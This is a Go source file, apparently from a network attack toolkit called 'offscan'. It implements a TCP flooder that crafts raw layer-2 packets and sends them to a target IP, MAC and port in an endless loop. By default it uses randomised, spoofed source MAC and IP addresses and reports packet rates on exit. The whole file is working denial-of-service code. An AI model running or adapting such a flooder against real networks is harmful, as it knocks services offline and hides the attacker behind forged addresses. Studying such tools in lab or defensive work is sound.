/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package floodtcp

import (
	"fmt"
	"net"
	"time"

	"offscan/internal/conv"
	"offscan/internal/generators"
	"offscan/internal/ifaceinfo"
	"offscan/internal/packet"
	"offscan/internal/sockets"
	"offscan/internal/sysinfo"
	"offscan/internal/utils"
)



func Run(args []string) {
    New(args).Execute()
}



type TcpFlooder struct {
    builder   *packet.TcpPkt
    iface     *net.Interface
    pktsSent   int
    rand      *generators.RandomValues
    srcIP      net.IP
    srcMAC     net.HardwareAddr
    dstIP      net.IP
    dstMAC     net.HardwareAddr
    dstPort    uint16
    duration   float64
}



func New(argList []string) *TcpFlooder {
    args   := ParseTcpArgs(argList)

	dstIP  := conv.MustStrToIPv4(args.DstIP)
	dstMAC := conv.MustStrToMac(args.DstMAC)

	iface  := sysinfo.MustRouteIfaceForDstIP(dstIP)
    cidr   := ifaceinfo.MustCIDR(iface)
	
	srcIP  := net.ParseIP(args.SrcIP)
	srcMAC := sysinfo.ResolveMac(args.SrcMAC, iface)

    firstIP, lastIP := utils.GetFirstAndLastIP(cidr)
	
	randGen := generators.NewRandomValues(&firstIP, &lastIP)

    return &TcpFlooder{
        builder:   packet.NewTcpPkt(),
        iface:     iface,
        rand:      randGen,
        srcIP:     srcIP,
        srcMAC:    srcMAC,
        dstIP:     dstIP,
        dstMAC:    dstMAC,
        dstPort:   args.Port,
    }
}



func (t *TcpFlooder) Execute() {
    t.displayInfo()
    t.sendEndlessly()
    t.displayExecInfo()
}



func (t *TcpFlooder) displayInfo() {
    srcMACStr := "Random"
    if t.srcMAC != nil {
        srcMACStr = t.srcMAC.String()
    }

	srcIPStr := "Random"
    if t.srcIP != nil {
        srcIPStr = t.srcIP.String()
    }

	fmt.Printf("[*] SRC >> MAC: %s / IP: %s\n", srcMACStr, srcIPStr)
    fmt.Printf("[*] DST >> MAC: %s / IP: %s\n", t.dstMAC.String(), t.dstIP.String())
    fmt.Printf("[*] IFACE: %s\n", t.iface.Name)
}



func (t *TcpFlooder) sendEndlessly() {
    socket := sockets.NewL2Socket(t.iface)
    ctx    := utils.SignalContext()

    fmt.Println("[+] Sending packets. Press CTRL + C to stop")
    start := time.Now()

    for {
        select {
        case <-ctx.Done():
            fmt.Println("\n[-] Flood interrupted")
            t.duration = time.Since(start).Seconds()
            return
        
		default:
            pkt := t.getPkt()
            socket.Send(pkt)
            t.pktsSent++
        }
    }
}



func (t *TcpFlooder) getPkt() []byte {
    srcMAC := t.srcMAC
    if srcMAC == nil {
        srcMAC = t.rand.RandomMac()
    }

	srcIP := t.srcIP
    if srcIP == nil {
        srcIP = t.rand.RandomIP()
    }

	srcPort := t.rand.RandomPort()

	return t.builder.L2Pkt(srcMAC, srcIP, srcPort, t.dstMAC, t.dstIP, t.dstPort)
}



func (t *TcpFlooder) displayExecInfo() {
    fmt.Printf("[%%] %d packets sent in %.2f seconds\n", t.pktsSent, t.duration)
    if t.duration > 1.0 {
        rate := float64(t.pktsSent) / t.duration
        fmt.Printf("[%%] %.2f packets sent per second\n", rate)
    }
}